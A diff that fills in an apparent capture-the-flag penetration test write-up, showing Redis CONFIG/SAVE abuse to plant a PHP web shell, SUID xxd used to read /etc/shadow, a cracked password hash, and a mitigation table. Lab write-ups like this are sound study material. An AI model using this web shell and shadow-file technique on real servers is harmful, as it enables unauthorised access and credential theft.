@@ -54,7 +54,6 @@ Following the PTES (Penetration Testing Execution Standard):
 ## Active
 
 nmap -sS -sV -p- 10.10.171.200       
-
 ```
 PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
@@ -68,7 +67,8 @@ PORT     STATE SERVICE VERSION
 
  Redis Access:
 
-    Include commands/tools used
+    Include commands/tools used:
+´´´
     redis-cli -h 10.10.171.200 -p 6379
 
     10.10.171.200:6379> help
@@ -84,67 +84,123 @@ To set redis-cli preferences:
       ":set hints" enable online hints
       ":set nohints" disable online hints
 Set your preferences in ~/.redisclirc`
- 
+´´´
 
-   
+Checked if Writing Files allowed and created a shell payload:
 
-sqlmap -u "http://[target]/login.php?user=*" --dbs
+´´´
+10.10.171.200:6379> config set dir /var/www/html
+OK
+10.10.171.200:6379> config set dbfilename shell.php
+OK
+10.10.171.200:6379> set payload "<?php system($_GET['cmd']); ?>"
+OK
+10.10.171.200:6379> save
+OK
+´´´
+
+Created a listener:
+´´´
+nc -lvnp 4444
+´´´
 
 Gained Access As: www-data
+
 
 ----
 
 ## 6. Privilege Escalation
 
-    Method: SUID, Kernel Exploit, Weak Sudo
+    Method: SUID
 
-    Tool Used: LinPEAS / manual
+    Tool Used: xxd, GTFOBins
 
+    Commands:
+´´´
+whoami
 sudo -l
-(env) NOPASSWD: /bin/bash
+ls -la
+ls /home/vianka
+env
+cat /etc/crontab
+find / -perm -4000 -type f 2>/dev/null
+´´´
 
-Escalated To: root
+Findings:
+
+´´´´
+First flag in: /home/vianka/user.txr
+´´´
+
+
+/usr/bin/xxd
+
+GTOFBins:
+LFILE=/etc/shadow
+xxd "$LFILE" | xxd -r
+
+Now, able to read the /etc/shadow file:
+´´´
+vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+´´´
+
+To crack the password:
+´´´
+echo '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0' > shadow.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+sing default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+beautiful1       (?)     
+1g 0:00:00:00 DONE (2025-05-21 10:22) 1.886g/s 2415p/s 2415c/s 2415C/s kucing..poohbear1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+´´´ 
+su vianka
+´´´
+
+Escalated To: vianka
 
 ----
 
 ## 7. Post Exploitation
 
-    Passwords or tokens discovered
+    Passwords: beautiful1 
 
-    File system enumeration
+    Hashes: $6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0
 
-    Pivoting possible? Any lateral movement?
+    Escalated To: vianka for last flag inside /root/root.txt
 
 ----
 
 ## 8. Flags / Proof
 
-    User Flag: THM{user_flag_here}
+    User Flag: thm{red1s_rce_w1t***********}
 
-    Root Flag: THM{root_flag_here}
+    Root Flag: thm{xxd_pr**********}
 
     Other Credentials / Loot:
 
-        admin:pass123
-
-        JWT tokens
-
+        
 ----
 
 ## 9. Mitigations
 
-| Vulnerability              | Risk   | Suggested Mitigation                   |
-|---------------------------|--------|----------------------------------------|
-| Outdated WordPress Plugin | High   | Update or remove vulnerable plugin     |
-| Sudo misconfiguration     | High   | Restrict sudo rights properly          |
-| Open directory listing     | Medium | Disable autoindex in Apache config     |
+| Vulnerability              | Risk   | Suggested Mitigation                                                                                                                                  |
+|----------------------------|--------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
+| Redis Server Exposure      | High   | Add requirepass StrongPassword in redis.conf to force login;  Block port 6379 externally. Allow only trusted IPs via iptables, ufw, or cloud firewall.|     
+| SUID on xxd                | High   | Remove SUID Bit from Unnecessary Binaries                                                                                                             |
+| Weak Password              |High    | Enforce long, complex passwords with expiration policies.                                                                                             |
 
 ----
 
 ## 10. Notes
 
-    Time spent: [e.g., 3 hours]
+    Time spent: [e.g., 1 hour]
 
-    Tools used: nmap, gobuster, sqlmap, linpeas, Burp Suite, etc.
+    Tools used: nmap, redis-cli, xxd
 
+    Lessons learned: [Used Redis to drop a PHP reverse shell in the web root by abusing CONFIG and SAVE; xxd was incorrectly SUID — uncommon and dangerous. Misconfigurations are low-hanging fruit — but they’re often all it takes.]
     Lessons learned: [Add reflections]
